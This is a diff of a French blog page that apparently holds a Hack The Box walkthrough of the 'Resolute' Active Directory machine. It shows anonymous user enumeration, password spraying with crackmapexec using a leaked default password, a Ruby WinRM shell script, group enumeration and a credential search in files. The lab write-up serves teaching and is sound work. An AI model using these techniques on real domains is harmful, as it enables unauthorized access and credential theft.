@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="Resolute est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un mot de passe par défaut. L&rsquo;obtention d&rsquo;un shell via WinRM permet par la suite d&rsquo;énumérer les propriétés du domaine et de trouver un mot de passe pour un utilisateur membre du groupe local &ldquo;DnsAdmins&rdquo;. L&rsquo;escalade de privilège est réalisée au travers d&rsquo;un DLL hijacking." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/resolute/" />
-<meta property="article:published_time" content="2020-06-06T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2020-06-06T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2020-06-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-06T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/en/walkthroughs/hackthebox/resolute/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,169 +230,140 @@
   </header>
   <div class="post">
     <p>Resolute est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un mot de passe par défaut. L&rsquo;obtention d&rsquo;un shell via WinRM permet par la suite d&rsquo;énumérer les propriétés du domaine et de trouver un mot de passe pour un utilisateur membre du groupe local &ldquo;DnsAdmins&rdquo;. L&rsquo;escalade de privilège est réalisée au travers d&rsquo;un DLL hijacking.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
-<h2 id="découverte-énumération">Découverte / Énumération</h2>
-
+<h2 id="découverte--énumération">Découverte / Énumération</h2>
 <p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -T4 -p0-10000 -sV -O -sC 10.10.10.169 -v 
 
-<pre><code class="language-bash">$ sudo nmap -sS -T4 -p0-10000 -sV -O -sC 10.10.10.169 -v 
-
-Nmap scan report for 10.10.10.169
-Host is up (0.13s latency).
-Not shown: 9988 closed ports
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.169
+Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">9988</span> closed ports
 PORT     STATE SERVICE      VERSION
 53/tcp   open  tcpwrapped
-88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-11 18:35:03Z)
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-02-11 18:35:03Z<span style="color:#f92672">)</span>
 135/tcp  open  msrpc        Microsoft Windows RPC
 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: MEGABANK<span style="color:#f92672">)</span>
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  tcpwrapped
-3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
 3269/tcp open  tcpwrapped
-5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 9389/tcp open  mc-nmf       .NET Message Framing
-</code></pre>
-
-<p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
-
+</code></pre></div><p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
 <p>Il est possible d&rsquo;interroger l&rsquo;AD en tant qu&rsquo;utilisateur anonyme, ce qui permet notamment de récupérer la liste des utilisateurs du domaine (entre autres). L&rsquo;outil enum4linux permet d&rsquo;automatiser l&rsquo;extraction de quelques informations de l&rsquo;AD. Une information intéressante est identifiée dans le champs description de l&rsquo;utilisateur <code>marko</code> (cf partie suivante).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ enum4linux -a 10.10.10.169
 
-<pre><code class="language-bash">$ enum4linux -a 10.10.10.169
-
- ============================= 
+ <span style="color:#f92672">=============================</span> 
 |    Users on 10.10.10.169    |
- ============================= 
-Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
-index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)  Desc: (null)
-index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)  Desc: Built-in account for administering the computer/domain
-index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: (null)  Desc: (null)
-index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)  Desc: (null)
-index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: (null)  Desc: (null)
-index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: (null)  Desc: (null)
-index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: (null)  Desc: (null)
-index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)  Desc: A user account managed by the system.
-index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)  Desc: (null)
-index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)  Desc: (null)
-index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)  Desc: Built-in account for guest access to the computer/domain
-index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)  Desc: (null)
-index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)  Desc: Key Distribution Center Service Account
-index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null)  Desc: (null)
+ <span style="color:#f92672">=============================</span> 
+Use of uninitialized value $global_workgroup in concatenation <span style="color:#f92672">(</span>.<span style="color:#f92672">)</span> or string at ./enum4linux.pl line 866.
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
 index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
-index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)  Desc: (null)
-index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki  Name: (null)  Desc: (null)
-index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo  Name: (null)  Desc: (null)
-index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)  Desc: (null)
-index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)
-index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally  Name: (null)  Desc: (null)
-index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon  Name: (null)  Desc: (null)
-index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve  Name: (null)  Desc: (null)
-index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: (null)  Desc: (null)
-index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: (null)  Desc: (null)
-index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)  Desc: (null)
-index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)  Desc: (null)
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
 
-</code></pre>
-
-<p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
-
-<pre><code class="language-bash">$ cat /etc/hosts
+</code></pre></div><p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 kalinux
 
 10.10.10.169 megabank.local
-</code></pre>
-
-<pre><code class="language-bash">$ cat /etc/resolv.conf 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
 search megabank.local
 nameserver 10.10.10.169
-</code></pre>
-
-<h2 id="mot-de-passe-par-défaut-et-shell-utilisateur">Mot de passe par défaut et shell utilisateur</h2>
-
+</code></pre></div><h2 id="mot-de-passe-par-défaut-et-shell-utilisateur">Mot de passe par défaut et shell utilisateur</h2>
 <p>L&rsquo;énumération précédente indique la note <code>Account created. Password set to Welcome123!</code> pour l&rsquo;utilisateur marko. Ainsi il est probable qu&rsquo;il s&rsquo;agisse d&rsquo;un mot de passe par défaut mis en place par les administrateurs système.</p>
-
 <p>On construit une simple wordlist d&rsquo;utilisateur basée sur ceux récupérés auparavant et on tente une connexion avec chacun d&rsquo;eux.</p>
-
-<pre><code class="language-bash">$ crackmapexec smb 10.10.10.169 -u user_list -p 'Welcome123!'
-CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
-CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123! 
-[*] KTHXBYE!
-</code></pre>
-
-<p>L&rsquo;utilisateur <code>melanie</code> est ainsi récupéré !
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.169 -u user_list -p <span style="color:#e6db74">&#39;Welcome123!&#39;</span>
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:RESOLUTE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK<span style="color:#f92672">)</span>
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>bigail:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>ngela:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>nnette:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>nnika:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\c</span>laire:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\c</span>laude:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\f</span>elicia:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\f</span>red:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>elanie:Welcome123! 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
+</code></pre></div><p>L&rsquo;utilisateur <code>melanie</code> est ainsi récupéré !
 Cependant, ce compte n&rsquo;est pas administrateur et les possibilités d&rsquo;exécution de commande à distance sont limitées.
 C&rsquo;est là qu&rsquo;intervient WinRM (Windows Remote Management). Il s&rsquo;agit d&rsquo;un service/protocole Microsoft HTTP, basé sur WS-Management (SOAP) qui permet l&rsquo;administration à distance de machines sous Windows.
 De retour à notre scan nmap, le port <strong>5985</strong>, utilisé par défaut par WinRM, est ouvert.</p>
-
 <p>Plusieurs façon d&rsquo;exploiter. J&rsquo;ai choisi d&rsquo;utiliser le script Ruby suivant.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">$</span> cat winrm_shell<span style="color:#f92672">.</span>rb 
+require <span style="color:#e6db74">&#39;winrm&#39;</span>
 
-<pre><code class="language-ruby">$ cat winrm_shell.rb 
-require 'winrm'
-
-conn = WinRM::Connection.new(
-  endpoint: 'http://10.10.10.169:5985/wsman',
-  user: 'MEGABANK\melanie',
-  password: 'Welcome123!',
+conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">WinRM</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Connection</span><span style="color:#f92672">.</span>new(
+  <span style="color:#e6db74">endpoint</span>: <span style="color:#e6db74">&#39;http://10.10.10.169:5985/wsman&#39;</span>,
+  <span style="color:#e6db74">user</span>: <span style="color:#e6db74">&#39;MEGABANK\melanie&#39;</span>,
+  <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;Welcome123!&#39;</span>,
 )
 
-command=&quot;&quot;
+command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
 
-conn.shell(:powershell) do |shell|
-    until command == &quot;exit\n&quot; do
-        print &quot;PS &gt; &quot;
-        command = gets
-        output = shell.run(command) do |stdout, stderr|
-            STDOUT.print stdout
-            STDERR.print stderr
-        end
-    end
-    puts &quot;Exiting with code #{output.exitcode}&quot;
-end
-</code></pre>
-
-<p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell.rb 
+conn<span style="color:#f92672">.</span>shell(<span style="color:#e6db74">:powershell</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>shell<span style="color:#f92672">|</span>
+    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">do</span>
+        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
+        command <span style="color:#f92672">=</span> gets
+        output <span style="color:#f92672">=</span> shell<span style="color:#f92672">.</span>run(command) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>stdout, stderr<span style="color:#f92672">|</span>
+            <span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>print stdout
+            <span style="color:#66d9ef">STDERR</span><span style="color:#f92672">.</span>print stderr
+        <span style="color:#66d9ef">end</span>
+    <span style="color:#66d9ef">end</span>
+    puts <span style="color:#e6db74">&#34;Exiting with code </span><span style="color:#e6db74">#{</span>output<span style="color:#f92672">.</span>exitcode<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell.rb 
 PS &gt; whoami
-megabank\melanie
+megabank<span style="color:#ae81ff">\m</span>elanie
 
 PS &gt; type ../Desktop/user.txt
 0cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 PS &gt; 
-</code></pre>
-
-<h2 id="énumération-et-compromission-d-un-second-compte">Énumération et compromission d&rsquo;un second compte</h2>
-
+</code></pre></div><h2 id="énumération-et-compromission-dun-second-compte">Énumération et compromission d&rsquo;un second compte</h2>
 <p>Une énumération rapide des utilisateurs et groupes du domaine nous permet d&rsquo;apprendre que l&rsquo;utilisateur ryan est membre du groupe <code>Contractors</code>, lui même membre du groupe local <code>DnsAdmins</code>, ce qui en fait une cible de choix.</p>
-
-<pre><code class="language-bash">PS &gt; net user ryan /domain
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; net user ryan /domain
 User name                    ryan
 Full Name                    Ryan Bertrand
 Comment                      
-User's comment               
-Country/region code          000 (System Default)
+User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment               
+Country/region code          <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
 Account active               Yes
 Account expires              Never
 
@@ -387,9 +384,7 @@ Logon hours allowed          All
 Local Group Memberships      
 Global Group memberships     *Domain Users         *Contractors          
 The command completed successfully.
-</code></pre>
-
-<pre><code class="language-bash">PS &gt; net localgroup DnsAdmins
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; net localgroup DnsAdmins
 Alias name     DnsAdmins
 Comment        DNS Administrators Group
 
@@ -398,172 +393,136 @@ Members
 -------------------------------------------------------------------------------
 Contractors
 The command completed successfully.
-</code></pre>
+</code></pre></div><p>La suite de l&rsquo;énumération se passe au niveau des fichiers de la machine. Après plusieurs tentatives de récupération d&rsquo;information, on réussit à récupérer le compte utilisateur de ryan, laissé dans un fichier.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; findstr /si ryan *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs
 
